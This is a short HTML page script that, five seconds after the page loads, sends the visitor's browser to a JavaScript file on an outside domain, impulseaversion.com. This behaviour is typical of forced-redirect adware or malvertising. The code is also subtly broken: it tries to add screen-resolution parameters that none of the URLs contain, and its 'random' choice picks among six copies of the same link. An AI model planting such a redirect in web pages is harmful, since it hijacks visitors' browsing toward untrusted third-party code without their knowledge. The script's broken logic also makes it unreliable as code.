   <script>
    window.onload = function() {
        // Visitor's screen resolution
        const screenWidth = window.screen.width;
        const screenHeight = window.screen.height;

        // List of links
        const links = [
            "//impulseaversion.com/44/75/1f/44751f4f48f6b90fa6438b4b51d2a200.js",
            "//impulseaversion.com/44/75/1f/44751f4f48f6b90fa6438b4b51d2a200.js",
            "//impulseaversion.com/44/75/1f/44751f4f48f6b90fa6438b4b51d2a200.js",
            "//impulseaversion.com/44/75/1f/44751f4f48f6b90fa6438b4b51d2a200.js",
            "//impulseaversion.com/44/75/1f/44751f4f48f6b90fa6438b4b51d2a200.js",
            "//impulseaversion.com/44/75/1f/44751f4f48f6b90fa6438b4b51d2a200.js"
        ];

        // Function to update the width and height in the URL
        function updateResolution(url) {
            return url.replace(/scrWidth=\d+/i, `scrWidth=${screenWidth}`)
                      .replace(/scrHeight=\d+/i, `scrHeight=${screenHeight}`);
        }

        // Update all links with the visitor's screen resolution
        const updatedLinks = links.map(updateResolution);

        // Randomly select one of the updated links
        const randomLink = updatedLinks[Math.floor(Math.random() * updatedLinks.length)];

        // Wait for 5 seconds before opening the link
        setTimeout(function() {
            window.location.href = randomLink;
        }, 5000);
    };
</script>
